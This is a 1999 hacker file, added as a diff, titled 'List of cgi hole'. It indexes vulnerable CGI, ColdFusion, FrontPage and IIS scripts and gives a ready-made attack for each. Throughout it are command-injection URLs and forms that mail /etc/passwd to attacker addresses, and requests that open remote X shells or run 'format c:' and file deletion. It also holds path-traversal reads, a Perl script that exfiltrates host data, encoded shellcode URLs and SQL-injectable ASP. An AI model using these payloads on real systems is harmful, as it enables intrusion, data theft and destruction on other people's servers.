@@ -1,0 +1,532 @@
+
+
+
+            °º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤°º¤ø,¸¸,ø¤º°°°º¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,°
+            °                                                                           °
+            °                                                                           °
+            °                      L i s t   o f   c g i   h o l e                      °
+            °                                                                           °
+            °                                                                           °
+            °º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤°º¤ø,¸¸,ø¤º°°°º¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,°
+
+write by putois octobre 99
+
+ Index:
+
+bugs cgi
+________
+ 
+           /cgi-bin/AT-generate.cgi
+           /cgi-bin/anyform.cgi
+           /cgi-bin/aglimpse
+           /cgi-bin/bnbform.cgi
+           /cgi-bin/campas
+           /cgi-bin/carbo
+           /cgi-bin/cgimail 
+           /cgi-bin/classifieds.cgi
+           /cgi-bin/count.cgi
+           /cgi-bin/dumpenv.pl
+           /cgi-bin/environ.cgi
+           /cgi-bin/file.pl
+           /cgi-bin/faxsurvey.cgi
+           /cgi-bin/formail
+           /cgi-bin/guestbook
+           /cgi-bin/handler
+           /cgi-bin/httpd
+           /cgi-bin/htmlscript
+           /cgi-bin/info2www
+           /cgi-bin/nph-test.cgi
+           /cgi-bin/nph-publish
+           /cgi-bin/perl.exe
+           /cgi-bin/pfdispaly.cgi
+           /cgi-bin/php
+           /cgi-bin/phf
+           /cgi-bin/Quid Pro Quo (mac os)
+           /cgi-bin/s97_cgi
+           /cgi-bin/survey.cgi
+           /cgi-bin/start
+           /cgi-bin/textcounter
+           /cgi-bin/uploader.exe
+           /cgi-bin/view-source
+           /cgi-bin/webdist
+           /cgi-bin/webgais           
+           /cgi-bin/websendmail
+           /cgi-bin/websites
+           /cgi-bin/webstart
+           /cgi-bin/whois_raw.cgi
+           /cgi-bin/wwwboard
+           /cgi-bin/www-msql 
+
+cold fusion
+___________
+
+
+           /cfdocs/expeval/openfile.cfm
+           /cfdocs/expeval/displayopenedfile.cfm
+           /cfdocs/expeval/exprcalc.cfm
+           /cfdocs/expeval/kdg.cfm           
+           /cfdocs/expeval/eval.cfm
+           /cfdocs/expeval/sendmail.cfm
+           /cfdocs/examples/httpclient/mainframeset.cfm
+           /cfdocs/exampleapp/docs/sourcewindow.cfm?Template=
+           
+websql
+______
+           sql
+
+front page
+__________
+
+           /_vti_bin/shtml.dll
+           _private/download.log
+
+          _vti_pvt/users.pwd           front page passwd user
+          _vti_pvt/administrators.pwd  front page passwd administrator
+
+
+iisadmin
+________
+
+          /scripts/iisadmin/
+
+
+AT-generate.cgi
+_______________
+
+<html> <head><title>exploit</title>
+<body>
+<p><FORM ACTION="http://EWS.SERVER.COM/cgi-bin/AT-generate.cgi"
+        METHOD=POST>
+<INPUT TYPE="hidden" NAME="db" VALUE="personal">
+<INPUT TYPE="submit" NAME="Reload" VALUE="Reload">
+Reload this page, in case the log file or status  has changed.
+<INPUT TYPE="hidden" NAME="Dump" VALUE="dummy">
+<INPUT TYPE="hidden" NAME="File"
+VALUE="/usr/local/etc/excite/collections/AT-personal.prog"
+<INPUT TYPE="hidden" NAME="Type" VALUE="progress">
+<INPUT TYPE="hidden" NAME="ENCRYPTEDPASS" VALUE="ENCRYPTEDPASS">
+</FORM><BR>
+</body>
+</html>
+
+anyform.cgi
+___________
+
+<input type="hidden" name="AnyFormTo" value="foo@bar.com;cmd-to
+execute with whatever arguments;/usr/lib/sendmail -t foo@bar.com">
+
+
+aglimpse   (telnet 80)
+________
+
+GET /cgi-bin/aglimpse/80|IFS=5;CMD=5mail5hack\@i.am\</etc/passwd;eval$CMD;echo HTTP/1.0
+
+
+
+bnbform.cgi
+___________
+
+FORM METHOD="POST" ACTION="http://www.victim.com/cgi-bin/bnbform.cgi">
+ FIELDS MARKED WITH * ARE REQUIRED!
+Your Name:*          
+<INPUT TYPE="TEXT" NAME="name" SIZE=35 MAXLENGTH=50>
+<!--  SCRIPT CONFIGURATION SECTION -->
+<INPUT TYPE="HIDDEN" NAME="autorespond" VALUE="yes">
+<INPUT TYPE="HIDDEN" NAME="automessage" VALUE="/etc/passwd">
+<INPUT TYPE="HIDDEN" NAME="ok_url" VALUE="http://127.0.0.1/thanks.html">
+<INPUT TYPE="HIDDEN" NAME="not_ok_url" VALUE="http://127.0.0.1/oops.html">
+
+campas (telnet 80)
+______
+
+GET /cgi-bin/campas?%0acat%0a/etc/passwd%0a
+
+
+carbo
+_____
+
+http://host/carbo.dll?icatcommand=file_to_view&catalogname=catalog
+
+
+
+cgimail.exe (nt)
+________________
+
+<form action="/scripts/CGImail.exe" method="POST" NAME="TestForm">
+<input type=hidden name="$File$" value="/scripts/template.txt">
+<input type=hidden name="$Subject$" value="CGImail Example">
+<input type=hidden name="$LocationOK$" value="/ok.html">
+<input type=hidden name="$LocationKO$" value="/ko.html">
+<input type=hidden name="$To$" value="mnemonix@globalnet.co.uk">
+<input type=hidden name="$Optional$" value="mmmh, no!">
+
+
+classifieds.cgi
+_______________
+
+<form method=post action="/cgi-bin/classifieds.cgi">
+<input type="hidden" name="ClassifiedsDir" value="/home/httpd/html/class/ads/">
+<input type="hidden" name="ViewDir" value="http://victim.com/class/ads/">
+<input type="hidden" name="ErrorReturn" value="http://victim.com/class/index.html">
+<input type="hidden" name="ReturnURL" value="http://victim.com/class/hi.html">
+<input type="hidden" name="return" value="duke@viper.net.au">
+<input type="hidden" name="mailprog" value="touch /tmp/bighole">
+<b>Which department do you want your ad to be placed in or you would like to view?
+</form>
+
+
+count.cgi
+_________
+
+http://attacked.host.com/cgi-bin/Count.cgi?display=image&image=../../path/file.gif
+
+dumpenv.pl
+__________
+
+http://www.site.net/cgi-bin/dumpenv.pl?/session/adminlogin?RCpage=/sysadmin/index.stm 
+http://www.site.net/c:/program files/sambar41
+
+
+
+
+environ.cgi     (telnet 80)
+___________
+
+/cgi-bin/environ.cgi HTTP/1.1" 200 2034
+
+file.pl
+_______
+
+http://netware.nmrc.org/perl/files.pl?file=sys:system/autoexec.ncf
+http://netware.nmrc.org/perl/files.pl?file=sys:etc/ldremote.ncf
+http://netware.nmrc.org/perl/files.pl?file=vol2:apps/accounting/payroll.doc
+
+
+faxsurvey
+_________
+
+http://linux.elsewhere.org/cgi-bin/faxsurvey?/bin/cat%20/etc/passwd
+
+
+
+FormMail
+________
+
+<html><head><title>hack</title></head>
+<body><form method="post" action=
+"http://www.clueless-sysadmin.se/cgi-bin/formmail.pl">
+<input type="hidden" name="recipient" value=
+"ugh@hotmail.com; cat /etc/passwd | mail ugh@hotmail.com">
+<input type="submit" name="submit" value="submit">
+</form></body></html>
+
+guestbook
+_________
+
+/cgi-bin/wguest.exe?template=3dc:\boot.ini
+/cgi-bin/rguest.exe?template=3dc:\winnt\system32\$winnt$.inf
+
+
+handler  (telnet 80)
+_______
+ GET /cgi-bin/handler/useless_shit;cat   /etc/passwd|?data=Download HTTP/1.0
+                                      -> push tab key after cat
+
+GET /cgi-bin/handler/whatever;cat       /etc/passwd|    ?data=Download
+/cgi-bin/handler/whatever;cat\t/etc/passwd\|\t 
+GET /cgi-bin/handler/ ;/usr/sbin/xwsh  -display  enemy:0|?data=Download
+GET /cgi-bin/handler/   ;cat    /etc/passwd|?data=Download
+
+
+htmlscript
+__________
+
+http://www.vulnerable.server.com/cgi-bin/htmlscript?../../../../etc/passwd
+
+
+httpd    (telnet 80)
+_____
+
+GET / HTTP/1.0" 404 -9999999 "
+
+
+info2www
+________
+
+REQUEST_METHOD=GET ./info2www '(../../../../bin/mail user_name </etc/passwd|)'
+
+
+
+
+nph-test-cgi  (test-cgi)
+________________________
+
+just that: /cgi-bin/nph-test.cgi /*
+           /cgi-bin/nph-test.cgi /*etc/*
+/cgi-bin/test-cgi?\help&0a/bin/cat%20/etc/passwd
+
+note: only with netscape 3 on windows
+
+nph-publish
+___________
+
+HTTP/1.0 400
+Request method must be PUT to call this script!
+PUT /../index.html HTTP/1.0
+Connection: Keep-Alive
+User-Agent: Mozilla/3.01Gold (Win95; I)
+Host: 127.0.0.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+Content-Length: 666
+
+perl.exe
+________
+
+http://myhost.com/cgi-bin/perl.exe?-e?'format?c:'
+http://host.com/cgi-bin/perl.exe?-e?'format%20c:'
+http://www.target.com/cgi-bin/perl.exe?&-e+unlink+%3C*%3E
+
+
+pfdispaly.cgi
+_____________
+
+lynx -source 'http://victim.com/cgi-bin/pfdispaly.cgi?/../../../../etc/
+$lynx -dump http://victim/cgi-bin/pfdispaly.cgi?'%0A/bin/uname%20-a|'
+ http://victim/cgi-bin/pfdispaly.cgi?'%0A/usr/bin/X11/xclock%20-display%20evil:0.0|'
+
+phf
+___
+
+/cgi-bin/phf?Qname=%0Acat%20/etc/passwd
+/cgi-bin/phf?Qname=%0Acd%20/%0als
+/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+php.cgi
+_______
+
+http://boogered.system.com/cgi-bin/php.cgi?/file/to/view
+
+Quid Pro Quo (mac os)
+_____________________
+
+http://site.name/server%20logfile
+
+
+s97_cgi
+_______
+
+http://www.xxx.com/search97.vts?HLNavigate=On&querytext=dcm&ServerKey=Primary&ResultTemplate=../../../../../../../etc/passwd
+&ResultStyle=simple&ResultCount=20&collection=books
+
+
+
+survey.cgi
+__________
+
+<FORM METHOD="POST" ACTION="www.victim.com/cgi-bin/survey.cgi">
+<input type=hidden name=action value="VOTE">
+<input type=hidden name=filebase value="bleh; /bin/mail you@your_email_address.com
+<PRE>
+Your Gender
+<input type=radio name=ITEM1 value="0">Male
+<input type=radio name=ITEM1 value="1">Female
+<input type=radio name=ITEM1 value="2">Neuter
+<INPUT TYPE="submit" VALUE="VOTE!">
+
+
+start
+_____
+
+/cgi-bin/start?curmbox=ACTIVE&js=no&login
+
+textcounter
+___________
+
+#!/usr/bin/perl
+$URL='http://dtp.kappa.ro/a/test.shtml';    # please _modify_ this
+$EMAIL='pdoru@pop3.kappa.ro,root';          # please _modify_ this
+if ($ARGV[0]) {
+$CMD=$ARGV[0];
+}else{
+$CMD="(ps ax;cd ..;cd ..;cd ..;cd etc;cat hosts;set)\|mail ${EMAIL} -sanothere_one";
+}
+$text="${URL}/;IFS=\8;${CMD};echo|";
+$text =~ s/ /\$\{IFS\}/g;
+system({"lynx"} "lynx", $text);
+system({"lynx"} "lynx", $text);
+
+uploader.exe
+____________
+
+<FORM ENCTYPE="multipart/form-data" METHOD=POST
+ACTION="/cgi-win/uploader.exe/Uploads/">
+<PRE>Your name:   <INPUT TYPE=TEXT SIZE=20 NAME="name"> (required)
+Email address:    <INPUT TYPE=TEXT SIZE=20 NAME="email"> (required)
+          <b>NOTE:</b>
+File to upload:   <INPUT TYPE=FILE NAME="upl-file" SIZE=40>
+File description: <INPUT TYPE=TEXT SIZE=40 NAME="desc"> (required)
+<INPUT TYPE=SUBMIT VALUE="Upload Now"></PRE>
+</FORM>
+
+
+
+<FORM ENCTYPE="multipart/form-data" METHOD=POST
+ACTION="http://host.of.vulnerable.website/cgi-win/uploader.exe/cgi-win/">
+<INPUT TYPE=HIDDEN NAME="name" VALUE="Foo">
+<INPUT TYPE=HIDDEN NAME="email" VALUE="Foo@bar.com>
+File to upload: <INPUT TYPE=FILE NAME="upl-file" SIZE=40><BR>
+<INPUT TYPE=TEXT SIZE=40 NAME="desc" VALUE="YouGottaSecurityProblem">
+<INPUT TYPE=SUBMIT VALUE="Upload Now">
+</FORM>
+
+view-source
+___________
+
+http://hack.com/cgi-bin/view-source?../../../../../../../etc/passwd'
+
+
+
+webdist
+_______
+
+http://host.com/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd
+http://host/cgi-bin/webdist.cgi?distloc=;/usr/bin/X11/xterm%20-display%20hacker:0.0%20-ut%20-e%20/bin/sh
+
+* run also for :  wrap.cgi, handler.cgi, day5datacopier.cgi, day5notifier.cgi
+
+http://victim/cgi-bin/wrap/blah;/tmp/myscript
+http://sgi.victim/cgi-bin/wrap?/../../../../../etc
+
+webgais
+_______
+
+telnet target.machine.com 80
+POST /cgi-bin/webgais HTTP/1.0
+Content-length: 80 (replace this with the actual length of
+the "exploit" line)
+query=';mail+you\@your.host</etc/passwd;echo'&output=subject
+&domain=paragraph
+
+websendmail
+___________
+
+telnet target.machine.com 80
+Content-length: xxx (should be replaced with the actual length  of
+the string passed to the server, in this case xxx=97)
+receiver=;mail+your_address\@somewhere.org</etc/passwd;&sender=a
+&rtnaddr=a&subject=a&content=a
+
+websites
+________
+
+http://website.host/cgi-dos/args.cmd?"&any+dos+command"
+http://website.host/cgi-dos/args.bat?"&any+dos+command"
+
+
+(winnt version)
+http://website.host/cgi-shl/win-c-sample.exe?+-+-+-+-+-+-+-+-+-+-+-+-
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+h^X%FF%E6%FF%D4%83%C6Lj%01V%8A
+%06<_u%03%80.?FAI%84%C0u%F0h0%10%F0wYhM\y[X%050PzPA9%01u%F0%83%E9%10%
+FF%D1h0%10%F0wYh%D0PvLX%0500vPA9%01u%F0%83%E9%1C%FF%D1cmd.exe_/c_copy
+_\WebSite\readme.1st_\WebSite\htdocs\x1.htm
+
+(win95 version)
+http://website.host/cgi-shl/win-c-sample.exe?+-+-+-+-+-+-+-+-+-+-+-+-
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+h^X%FF%E6%FF%D4%83%C62j%01V%8A
+%06<_u%03%80.?FAI%84%C0u%F0%BAto|_%B9t`}`%03%CA%FF%D1%BAX_|_%B9XP|`%0
+3%CA%FF%D1c:\command.com_/c_copy_\WebSite\readme.1st_\WebSite\htdocs\
+x1.htm
+
+
+webstart
+________
+
+
+http://your.site/WebSTAR%20LOG
+
+
+wwwboard.pl
+___________
+
+<form method=POST action="http://some.poor.host/cgi-bin/wwwboard.pl">
+<input type=hidden name="followup" value="1,2,3,4,5,|.|">
+<input type=submit value="Clobber web board">
+</form>
+
+whois_raw
+_________
+
+/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
+
+
+www-msql
+________
+
+http://www.thegnome.com/secure/.htaccess
+http://www.thegnome.com/secure/.wwwacl   
+http://your.server/cgi-bin/www-sql/protected/something.html
+
+Cold fusion
+___________
+
+http://www.server.com/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\winnt\repair\setup.log
+http://www.server.com/cfdocs/expeval/ExprCalc.cfm?RequestTimeout=2000&OpenFilePath=C:\Inetpub\wwwroot\cfdocs\expeval\.\myfile.txt 
+http://www.server.com/cfdocs/expeval/kdg.cfm?DirPath=C%3A%5Cinetpub%5Cwwwroot%5C
+http://www.server.com//cfdocs/expeval/sendmail.cfm?MailFrom=&MailTo=&Subject=&Message=
+http://server/cfdocs/snippets/fileexists.cfm?..\..\..\..\boot.ini
+http://server/cfdocs/snippets/gettempdirectory.cfm 
+http://server/cfdocs/snippets/viewexample.cfm?Tagname=..\..\
+
+
+
+
+front page
+__________
+
+
+<!--webbot BOT="GeneratedScript" endspan -->
+<form method="POST" action="../_vti_bin/shtml.dll/downloads/ftp.html" 
+name="FrontPage_Form1" webbot-action="--WEBBOT-SELF--">
+<!--webbot bot="SaveResults" 
+u-file="d:\us\product_downloads\download_log.csv"
+s-format="TEXT/CSV" s-label-fields="FALSE" s-builtin-fields="Date Time" 
+s-form-fields u-confirmation-url="../_confirmations/ftp.html"
+startspan -->     
+
+
+      
+<!--webbot bot="SaveResults" 
+u-file="/_private/download.log"
+s-format="TEXT/TEXT" s-form-fields startspan -->
+
+
+/scripts/iisadmin/bdir.htr??<path>
+/scripts/iisadmin/bdir.htr??d:\webs\
+http://site/iissamples/exair/howitworks/codebrws.asp?source=/../../boot.ini
+
+
+websql
+______
+
+
+<% SQLquery="SELECT * FROM phonetable"
+Set Conn = Server.CreateObject("ADODB.Connection")
+Conn.Open "DSN=websql;UID=sa;PWD=pwd;DATABASE=master"
+Set rec = Server.CreateObject("ADODB.RecordSet")
+rec.ActiveConnection=Conn
+rec.Open SQLquery %>
+
+
+<% SQLquery="SELECT * FROM phonetable WHERE name='" & _
+request.querystring("name") & "'"
+Set Conn = Server.CreateObject("ADODB.Connection")
+Conn.Open "DSN=websql;UID=sa;PWD=pwd;DATABASE=master"
+Set rec = Server.CreateObject("ADODB.RecordSet")
+rec.ActiveConnection=Conn
+rec.Open SQLquery %>
+
+
+
+
+
+
